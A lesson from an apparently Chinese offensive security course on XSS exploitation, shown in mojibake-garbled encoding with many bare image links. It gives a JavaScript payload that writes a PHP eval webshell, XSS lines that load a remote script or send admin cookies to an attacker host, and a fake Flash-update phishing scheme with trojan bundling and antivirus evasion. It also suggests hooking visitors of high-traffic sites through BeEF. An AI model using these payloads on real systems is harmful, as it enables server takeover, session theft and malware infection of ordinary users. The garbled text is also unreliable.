# ğŸ¯ è¯¾ç¨‹54ï¼šXSSå¹³å°æ­å»ºã€æ¼æ´å¤ç°ä¸é«˜çº§åˆ©ç”¨ç¯å¢ƒ

![](img/8da8e0e1f87a1abc1033c7807feddf84_1.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_3.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_5.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_7.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_9.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_11.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_12.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_14.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_16.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_18.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥å­¦ä¹ è·¨ç«™è„šæœ¬æ”»å‡»çš„å®æˆ˜åˆ©ç”¨ã€‚è¯¾ç¨‹å°†æ¶µç›–ä»åŸºç¡€çš„Cookieçªƒå–ï¼Œåˆ°ç»“åˆåå°æ•°æ®åŒ…è¿›è¡Œè‡ªåŠ¨åŒ–æ”»å‡»ï¼Œå†åˆ°åˆ©ç”¨é’“é±¼é¡µé¢å’Œé«˜çº§æ”»å‡»å¹³å°è¿›è¡Œç»¼åˆæ¸—é€ã€‚æˆ‘ä»¬è¿˜ä¼šå­¦ä¹ å¦‚ä½•è‡ªä¸»æ­å»ºXSSå¹³å°ï¼Œä»¥é¿å…ä½¿ç”¨å…¬å…±å¹³å°å¸¦æ¥çš„é£é™©ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_20.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_21.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_23.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_25.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_27.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_29.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_31.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_33.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_35.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_37.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_39.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_41.png)

## ğŸ” å›é¡¾ä¸é—®é¢˜å®šä½

![](img/8da8e0e1f87a1abc1033c7807feddf84_43.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_45.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_47.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_49.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_51.png)

ä¸Šä¸€èŠ‚è¯¾æˆ‘ä»¬å°è¯•åˆ©ç”¨å°çš®é¢æ¿çš„XSSæ¼æ´è·å–ç®¡ç†å‘˜Cookieï¼Œä½†å®éªŒæœªèƒ½æˆåŠŸã€‚æœ¬èŠ‚æˆ‘ä»¬é¦–å…ˆæ¥åˆ†æå¤±è´¥çš„åŸå› å¹¶æ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_53.png)

å®éªŒå¤±è´¥å¹¶éå› ä¸ºXSSè¯­å¥æœªæ‰§è¡Œï¼Œè€Œæ˜¯å› ä¸ºç›®æ ‡ç³»ç»Ÿé™¤äº†CookieéªŒè¯å¤–ï¼Œè¿˜ä½¿ç”¨äº†é¢å¤–çš„ä»¤ç‰Œæœºåˆ¶ï¼ˆå¦‚ `access_token`ï¼‰ã€‚å› æ­¤ï¼Œä»…è·å–Cookieä¸è¶³ä»¥é€šè¿‡èº«ä»½éªŒè¯ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_55.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_57.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_59.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_61.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_63.png)

**æ ¸å¿ƒé—®é¢˜**ï¼š`Cookie + Token` åŒé‡éªŒè¯æœºåˆ¶ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_65.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_67.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_69.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_71.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_73.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_75.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_77.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_79.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_81.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_83.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_85.png)

## ğŸ› ï¸ è¿›é˜¶åˆ©ç”¨ï¼šJSä»£ç å†™å…¥åé—¨

![](img/8da8e0e1f87a1abc1033c7807feddf84_87.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_89.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_91.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_92.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_94.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_96.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_98.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_100.png)

æ—¢ç„¶ç›´æ¥çªƒå–Cookieè¡Œä¸é€šï¼Œæˆ‘ä»¬éœ€è¦è½¬æ¢æ€è·¯ã€‚é€šè¿‡åˆ†æå‘ç°ï¼Œç›®æ ‡åå°å­˜åœ¨æ–‡ä»¶ç¼–è¾‘æˆ–è®¡åˆ’ä»»åŠ¡æ·»åŠ åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨XSSæ‰§è¡ŒJavaScriptä»£ç ï¼Œæ¨¡æ‹Ÿç®¡ç†å‘˜æ“ä½œï¼Œä»è€Œå†™å…¥Webshellã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_102.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_104.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_105.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_107.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_109.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_110.png)

**æ”»å‡»æµç¨‹**ï¼š
1.  åœ¨æœ¬åœ°æ­å»ºç›¸åŒç¯å¢ƒï¼Œåˆ†æåå°å…³é”®æ“ä½œï¼ˆå¦‚å†™å…¥æ–‡ä»¶ï¼‰çš„æ•°æ®åŒ…ã€‚
2.  å°†æ•°æ®åŒ…è½¬æ¢ä¸ºJavaScriptä»£ç ï¼Œä¿å­˜ä¸º `poc.js` æ–‡ä»¶ã€‚
3.  å°† `poc.js` æ‰˜ç®¡åœ¨æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ä¸Šã€‚
4.  æ„é€ XSSè½½è·ï¼Œè®©å—å®³è€…çš„æµè§ˆå™¨åŠ è½½å¹¶æ‰§è¡Œè¿œç¨‹çš„ `poc.js`ã€‚
5.  `poc.js` æ‰§è¡Œåï¼Œä¼šå‘ç›®æ ‡ç½‘ç«™ç›®å½•å†™å…¥ä¸€ä¸ªåé—¨æ–‡ä»¶ï¼ˆå¦‚ `1.php`ï¼‰ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_112.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_114.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_116.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_118.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_120.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_121.png)

ä»¥ä¸‹æ˜¯æ¨¡æ‹ŸHTTP POSTè¯·æ±‚å†™å…¥æ–‡ä»¶çš„JSä»£ç æ ¸å¿ƒé€»è¾‘ï¼š

![](img/8da8e0e1f87a1abc1033c7807feddf84_123.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_125.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_127.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_129.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_131.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_133.png)

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', '/admin/path/to/write_file.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('filename=1.php&content=<?php @eval($_POST["cmd"]);?>');
```

![](img/8da8e0e1f87a1abc1033c7807feddf84_134.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_135.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_137.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_139.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_141.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_143.png)

**å…³é”®ç‚¹**ï¼šæ­¤æ–¹æ³•æˆåŠŸçš„å‰ææ˜¯ï¼Œæ”»å‡»è€…éœ€è¦é¢„å…ˆçŸ¥æ™“åå°ç‰¹å®šåŠŸèƒ½çš„æ•°æ®åŒ…ç»“æ„ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_145.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_147.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_148.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_149.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_151.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_153.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_155.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_157.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_158.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_160.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_162.png)

## ğŸ§ª å®æˆ˜å¤ç°ä¸€ï¼šå°çš®é¢æ¿Getshell

![](img/8da8e0e1f87a1abc1033c7807feddf84_164.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_166.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_168.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_170.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_172.png)

æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¤ç°é’ˆå¯¹å°çš®é¢æ¿çš„å®Œæ•´æ”»å‡»é“¾ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_174.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_176.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_178.png)

**å®éªŒæ­¥éª¤**ï¼š
1.  **è§¦å‘XSS**ï¼šåœ¨ç™»å½•å¤±è´¥å¤„æ’å…¥XSSä»£ç ï¼Œä¾‹å¦‚ `<script src="http://æ”»å‡»è€…IP/poc.js"></script>`ã€‚
2.  **ç®¡ç†å‘˜è§¦å‘**ï¼šç®¡ç†å‘˜ç™»å½•åï¼ŒæŸ¥çœ‹åŒ…å«XSSä»£ç çš„é”™è¯¯æ—¥å¿—ã€‚
3.  **ä»£ç æ‰§è¡Œ**ï¼šç®¡ç†å‘˜çš„æµè§ˆå™¨åŠ è½½å¹¶æ‰§è¡Œ `poc.js`ã€‚
4.  **å†™å…¥åé—¨**ï¼š`poc.js` ä»£ç æ‰§è¡Œï¼Œåœ¨ç½‘ç«™æ ¹ç›®å½•ï¼ˆå¦‚ `/www/wwwroot/xxx/`ï¼‰ä¸‹ç”Ÿæˆ `1.php` åé—¨æ–‡ä»¶ã€‚
5.  **è¿æ¥åé—¨**ï¼šæ”»å‡»è€…ä½¿ç”¨èšå‰‘æˆ–å“¥æ–¯æ‹‰ç­‰å·¥å…·è¿æ¥ `http://ç›®æ ‡ç«™ç‚¹/1.php`ï¼ŒæˆåŠŸè·å–æœåŠ¡å™¨æ§åˆ¶æƒã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_180.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_182.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_184.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_186.png)

> **æ³¨æ„**ï¼šå®éªŒè¿‡ç¨‹ä¸­éœ€ç¡®ä¿æ–‡ä»¶è·¯å¾„æ­£ç¡®ï¼Œå¹¶æ³¨æ„ç›®æ ‡ç³»ç»Ÿçš„ç›®å½•æƒé™ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_188.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_190.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_192.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_194.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_196.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_198.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_200.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_202.png)

## ğŸ£ å®æˆ˜å¤ç°äºŒï¼šCookieçªƒå–ä¸åå°ç™»å½•

![](img/8da8e0e1f87a1abc1033c7807feddf84_204.png)

æˆ‘ä»¬ä»¥ä¸€æ¬¾æ¨¡æ‹Ÿçš„â€œè´·æ¬¾å¹³å°â€ä¸ºä¾‹ï¼Œå±•ç¤ºæœ€ç»å…¸çš„XSSåˆ©ç”¨ï¼šçªƒå–Cookieå¹¶ç™»å½•åå°ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_206.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_208.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_210.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_212.png)

**æ¼æ´ç‚¹**ï¼šç”¨æˆ·â€œç»“ç®—è´¦å·â€ä¿¡æ¯ä¼šåœ¨åå°çš„â€œæç°ç”³è¯·â€åˆ—è¡¨ä¸­æ˜¾ç¤ºã€‚

**æ”»å‡»æµç¨‹**ï¼š
1.  **æ’å…¥è½½è·**ï¼šæ”»å‡»è€…å°†è‡ªå·±çš„â€œç»“ç®—è´¦å·â€ä¿®æ”¹ä¸ºXSSçªƒå–Cookieçš„ä»£ç ã€‚
    ```html
    <script>document.location='http://æ”»å‡»è€…å¹³å°/collect?cookie='+document.cookie</script>
    ```
2.  **ç”³è¯·æç°**ï¼šæ”»å‡»è€…æäº¤æç°ç”³è¯·ã€‚
3.  **ç®¡ç†å‘˜æŸ¥çœ‹**ï¼šç®¡ç†å‘˜åœ¨åå°å®¡æ ¸æç°è®°å½•æ—¶ï¼Œè§¦å‘XSSä»£ç ã€‚
4.  **Cookieå›ä¼ **ï¼šç®¡ç†å‘˜çš„Cookieè¢«å‘é€åˆ°æ”»å‡»è€…çš„æ¥æ”¶å¹³å°ã€‚
5.  **ç™»å½•åå°**ï¼šæ”»å‡»è€…å°†æ¥æ”¶åˆ°çš„Cookieæ›¿æ¢åˆ°æµè§ˆå™¨ä¸­ï¼Œå³å¯ç›´æ¥è®¿é—®ç®¡ç†å‘˜åå°ï¼Œæ— éœ€è´¦å·å¯†ç ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_214.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_216.png)

**æŠ€æœ¯è¦ç‚¹**ï¼šè¿™ç§â€œå­˜å‚¨å‹XSSâ€åˆ©ç”¨çš„æ˜¯ç”¨æˆ·è¾“å…¥åœ¨åå°å±•ç¤ºçš„ç¯èŠ‚ï¼Œå…³é”®åœ¨äºæ‰¾åˆ°â€œç®¡ç†å‘˜å¿…ç„¶ä¼šæŸ¥çœ‹â€çš„æ•°æ®ç‚¹ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_218.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_220.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_222.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_224.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_226.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_228.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_230.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_231.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_233.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_235.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_237.png)

## ğŸ¨ ç»“åˆé’“é±¼çš„é«˜çº§åˆ©ç”¨

![](img/8da8e0e1f87a1abc1033c7807feddf84_239.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_241.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_243.png)

XSSä¸ä»…å¯ä»¥çªƒå–æ•°æ®ï¼Œè¿˜èƒ½ä¸é’“é±¼æ”»å‡»ç»“åˆï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæ›´å±é™©çš„æ“ä½œã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_245.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_247.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_249.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_251.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_253.png)

**åœºæ™¯**ï¼šä¼ªé€ Flashæ›´æ–°é¡µé¢ã€‚
1.  **åˆ¶ä½œé’“é±¼é¡µ**ï¼šå…‹éš†ä¸€ä¸ªFlashæ’­æ”¾å™¨å®˜æ–¹æ›´æ–°é¡µé¢ã€‚
2.  **æ†ç»‘åé—¨**ï¼šå°†æœ¨é©¬ç¨‹åºä¸æ­£å¸¸çš„Flashå®‰è£…ç¨‹åºè¿›è¡Œæ†ç»‘ï¼Œå¹¶åšå…æ€å¤„ç†ã€‚
3.  **XSSå¼•å¯¼**ï¼šé€šè¿‡XSSå¼¹çª—æç¤ºç”¨æˆ·â€œFlashç‰ˆæœ¬è¿‡ä½ï¼Œè¯·ç«‹å³å‡çº§â€ã€‚
4.  **ç”¨æˆ·ä¸­æ‹›**ï¼šç”¨æˆ·ç‚¹å‡»æ›´æ–°åï¼Œä¸‹è½½å¹¶è¿è¡Œäº†æ†ç»‘æœ¨é©¬çš„â€œå®‰è£…ç¨‹åºâ€ï¼Œæ”»å‡»è€…ç”µè„‘è¢«æ§åˆ¶ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_255.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_257.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_259.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_261.png)

**æ¶‰åŠçš„æ‰©å±•æŠ€æœ¯**ï¼š
*   **ç½‘é¡µå…‹éš†**ï¼šåˆ¶ä½œé«˜ä»¿é’“é±¼é¡µé¢ã€‚
*   **ç¨‹åºæ†ç»‘**ï¼šå°†åé—¨ä¸æ­£å¸¸è½¯ä»¶ç»“åˆã€‚
*   **å…æ€å¤„ç†**ï¼šç»•è¿‡æ€æ¯’è½¯ä»¶æ£€æµ‹ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_263.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_265.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_267.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_269.png)

> æç¤ºï¼šç½‘é¡µå…‹éš†ä¸æœ¨é©¬æ†ç»‘æŠ€æœ¯åœ¨æœ¬ç³»åˆ—è¯¾ç¨‹çš„é’“é±¼ä¸“é¢˜ï¼ˆå¦‚ç¬¬152ã€154å¤©ï¼‰ä¸­æœ‰è¯¦ç»†è®²è§£ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_271.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_273.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_275.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_277.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_279.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_281.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_283.png)

## ğŸ—ï¸ è‡ªä¸»æ­å»ºXSSå¹³å°

![](img/8da8e0e1f87a1abc1033c7807feddf84_285.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_287.png)

ä¾èµ–å…¬å…±XSSå¹³å°å­˜åœ¨é£é™©ï¼ˆå¦‚ç‰¹å¾è¢«è¯†åˆ«ã€ä¸ç¨³å®šï¼‰ã€‚å› æ­¤ï¼ŒæŒæ¡è‡ªä¸»æ­å»ºèƒ½åŠ›è‡³å…³é‡è¦ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_289.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_291.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_293.png)

### å¹³å°ä¸€ï¼šè½»é‡å‹XSSå¹³å°

![](img/8da8e0e1f87a1abc1033c7807feddf84_295.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_297.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_299.png)

**ç‰¹ç‚¹**ï¼šéƒ¨ç½²ç®€å•ï¼ŒåŠŸèƒ½ä¸“æ³¨ï¼Œé€‚åˆåŸºç¡€åˆ©ç”¨ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_301.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_303.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_305.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_307.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_309.png)

**æ­å»ºæ­¥éª¤**ï¼š
1.  å°†æºç æ”¾ç½®äºWebç›®å½•ï¼ˆå¦‚ `xss/`ï¼‰ã€‚
2.  åœ¨PHPStudyç­‰ç¯å¢ƒä¸­ï¼Œä¸ºè¯¥ç›®å½•æ·»åŠ ä¸€ä¸ªç«™ç‚¹ï¼ˆå¦‚ç«¯å£81ï¼‰ã€‚
3.  è®¿é—® `http://IP:81` è¿›è¡Œå®‰è£…ï¼Œè®¾ç½®ç®¡ç†å¯†ç ã€‚
4.  ç™»å½•åï¼Œåˆ›å»ºæ–°çš„â€œé¡¹ç›®â€ï¼Œé€‰æ‹©â€œé»˜è®¤æ¨¡æ¿â€ï¼Œå¡«å…¥å¹³å°æ¥æ”¶åœ°å€ï¼Œç”ŸæˆXSSè½½è·ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_311.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_313.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_315.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_317.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_318.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_320.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_322.png)

**ä½¿ç”¨**ï¼šå°†ç”Ÿæˆçš„è½½è·æ’å…¥æ¼æ´ç‚¹ï¼Œå½“å—å®³è€…è§¦å‘åï¼Œå¹³å°â€œæ§åˆ¶é¢æ¿â€ä¼šæ”¶åˆ°Cookieã€IPã€User-Agentç­‰ä¿¡æ¯ã€‚

### å¹³å°äºŒï¼šBeEFï¼ˆæµè§ˆå™¨æ”»å‡»æ¡†æ¶ï¼‰

![](img/8da8e0e1f87a1abc1033c7807feddf84_324.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_325.png)

**ç‰¹ç‚¹**ï¼šåŠŸèƒ½å¼ºå¤§ï¼Œå¯å¯¹å—å®³è€…æµè§ˆå™¨è¿›è¡Œå®æ—¶äº¤äº’å¼æ§åˆ¶ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_327.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_329.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_331.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_333.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_334.png)

**æ­å»ºæ­¥éª¤ï¼ˆDockeræ–¹å¼ï¼‰**ï¼š
```bash
docker run -p 3000:3000 janes/beef
```
è®¿é—® `http://IP:3000/ui/panel`ï¼Œé»˜è®¤è´¦å·å¯†ç ä¸º `beef` / `beef`ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_336.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_338.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_340.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_342.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_344.png)

**æ ¸å¿ƒåŠŸèƒ½æ¼”ç¤º**ï¼š
*   **æµè§ˆå™¨åŠ«æŒ**ï¼šä¸Šçº¿åï¼Œå¯å‘½ä»¤å—å®³è€…æµè§ˆå™¨è·³è½¬åˆ°æŒ‡å®šç½‘å€ã€‚
*   **ç¤¾ä¼šå·¥ç¨‹å­¦**ï¼šå¼¹å‡ºä¼ªé€ çš„Flashæ›´æ–°å¼¹çª—ã€‚
*   **ä¿¡æ¯æ”¶é›†**ï¼šè·å–æµè§ˆå™¨æ’ä»¶ã€ç³»ç»Ÿä¿¡æ¯ç­‰ã€‚
*   **æŒä¹…åŒ–**ï¼šå°è¯•åœ¨æµè§ˆå™¨ä¸­ç»´æŒè®¿é—®ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_346.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_348.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_350.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_352.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_354.png)

**é«˜çº§åˆ©ç”¨æ€è·¯**ï¼šå°†BeEFçš„Hookä»£ç æ¤å…¥é«˜æµé‡ç½‘ç«™ï¼ˆå¦‚ä¸ªäººåšå®¢ï¼‰ï¼Œä»»ä½•è®¿é—®è¯¥ç«™çš„ç”¨æˆ·æµè§ˆå™¨éƒ½å¯èƒ½è¢«â€œé’“â€ä¸Šçº¿ï¼Œå½¢æˆä¸€ç§ä¸»åŠ¨å¼æ”»å‡»ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_356.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_358.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_360.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_362.png)

---

## ğŸ“š è¯¾ç¨‹æ€»ç»“

![](img/8da8e0e1f87a1abc1033c7807feddf84_364.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_366.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_368.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_370.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_372.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_374.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_375.png)

æœ¬èŠ‚è¯¾æˆ‘ä»¬ä¸€èµ·æ·±å…¥æ¢è®¨äº†XSSæ¼æ´çš„å¤šç§é«˜çº§åˆ©ç”¨æ–¹å¼ï¼š

![](img/8da8e0e1f87a1abc1033c7807feddf84_376.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_378.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_380.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_382.png)

1.  **æ€è·¯è½¬å˜**ï¼šä»å•çº¯çªƒå–Cookieï¼Œå‘å±•åˆ°åˆ©ç”¨JSæ¨¡æ‹Ÿåå°æ“ä½œå†™å…¥åé—¨ã€‚
2.  **ç»å…¸å¤ç°**ï¼šé€šè¿‡â€œè´·æ¬¾å¹³å°â€æ¡ˆä¾‹ï¼Œå®Œæ•´æ¼”ç»ƒäº†å­˜å‚¨å‹XSSçªƒå–Cookieå¹¶ç™»å½•åå°çš„æµç¨‹ã€‚
3.  **ç»„åˆæ”»å‡»**ï¼šå­¦ä¹ äº†XSSå¦‚ä½•ä¸é’“é±¼é¡µé¢ã€è½¯ä»¶æ†ç»‘ã€å…æ€æŠ€æœ¯ç»“åˆï¼Œå®ç°ä»Webåˆ°ä¸»æœºçš„çªç ´ã€‚
4.  **ç¯å¢ƒæ­å»º**ï¼šæŒæ¡äº†è‡ªä¸»æ­å»ºè½»é‡å‹XSSå¹³å°å’ŒåŠŸèƒ½å¼ºå¤§çš„BeEFæ”»å‡»æ¡†æ¶ï¼Œæ‘†è„±å¯¹å…¬å…±å¹³å°çš„ä¾èµ–ã€‚
5.  **ä¸»åŠ¨åˆ©ç”¨**ï¼šäº†è§£äº†å°†æ”»å‡»ä»£ç æ¤å…¥å¯ä¿¡ç½‘ç«™ï¼Œè¿›è¡Œä¸»åŠ¨å¼é’“é±¼çš„æ‰©å±•æ€è·¯ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_384.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_386.png)

